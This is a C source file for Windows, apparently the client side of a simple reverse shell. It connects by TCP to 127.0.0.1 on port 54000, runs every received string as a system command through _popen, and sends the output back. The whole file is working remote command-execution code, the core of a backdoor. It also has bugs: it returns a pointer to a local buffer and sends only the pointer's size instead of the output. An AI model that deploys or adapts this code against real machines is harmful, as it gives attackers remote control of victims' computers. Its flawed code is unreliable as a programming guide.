#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <WS2tcpip.h>
#include <io.h>
#include <direct.h>

#pragma comment (lib, "ws2_32.lib")

#define PORT        54000

//struct cmd_list
//{
//    char cmd;
//    char** args;
//};
//
//struct cmd_count 
//{
//    int word_count;
//    int space_count;
//};
//
//struct cmd_count count_cmd(const char* cmd)
//{
//    struct cmd_count cmd_;
//    return cmd_;
//}
//
//
//char** split_cmd(const char* cmd)
//{
//    return NULL;
//}

char* cd(char* path)
{
    char ret[1024];
    if (_chdir(path) == 0)
    {
        strcpy(ret, "[+] Successfully chnage to ");
        strcat(ret, path);
    }
    else
    {
        strcpy(ret, "[-] unable to locate ");
        strcat(ret, path);
    }
    return ret;
}

char* execute_command(const char* cmd)
{
    FILE* fd;
    fd = _popen(cmd, "r");
  
    if (!fd)
        return 0;

    char buffer[1];
    size_t chread;
    size_t cmdalloc = 2;
    size_t cmdlen = 0;
    char* cmdout = (char*)malloc(cmdalloc);
    ZeroMemory(cmdout, cmdalloc);
    while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0)
    {
        if (cmdlen + chread >= cmdalloc)
        {
            cmdalloc++;
            cmdout = (char*)realloc(cmdout, cmdalloc);
        }
        memmove(cmdout + cmdlen, buffer, chread);
        cmdlen += chread;
    }
    cmdout[cmdlen] = '\0';

    /* We can now work with the output as we please. Just print
     * out to confirm output is as expected */
    //fwrite(cmdout, 1, cmdlen, stdout);
    _pclose(fd);
    return cmdout;
}

int main(int argc, char* argv)
{

    char ipAddress[] = "127.0.0.1";
    WSADATA wsa;
    SOCKET client;

    //Initalization socket
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Failed. Error Code : %d.\nPress a key to exit...", WSAGetLastError());
        _getch();
        return 1;
    }

    //create socket    
    if ((client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d.\n", WSAGetLastError());
        WSACleanup();
        _getch();
        return 1;
    }

    //CONNECTING ...
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_port = htons(PORT);
    inet_pton(AF_INET, ipAddress, &address.sin_addr);

    // connection to server ...
    if (connect(client, (struct sockaddr*)&address, sizeof(address)) == SOCKET_ERROR)
    {
        printf("Connect error:%d.\nPress a key to exit...", WSAGetLastError());
        closesocket(client);
        WSACleanup();
        _getch();
        return 1;
    }

    char buf[4096];
    while (true)
    {
        memset(buf, 0, sizeof(buf));
        int bytesRecived = recv(client, buf, 4096, 0);
        if (bytesRecived == SOCKET_ERROR)
        {
            printf("Error in reciving ...\n");
            return 1;
        }
        if (bytesRecived == 0)
        {
            printf("Disconnnected\n");
            break;
        }        
        char* output = execute_command(buf);
        printf("%s\n", output);
        send(client, output, sizeof(output) + 1, 0);
    }

    closesocket(client);    
    WSACleanup();    
    _getch();
	return 0;
}
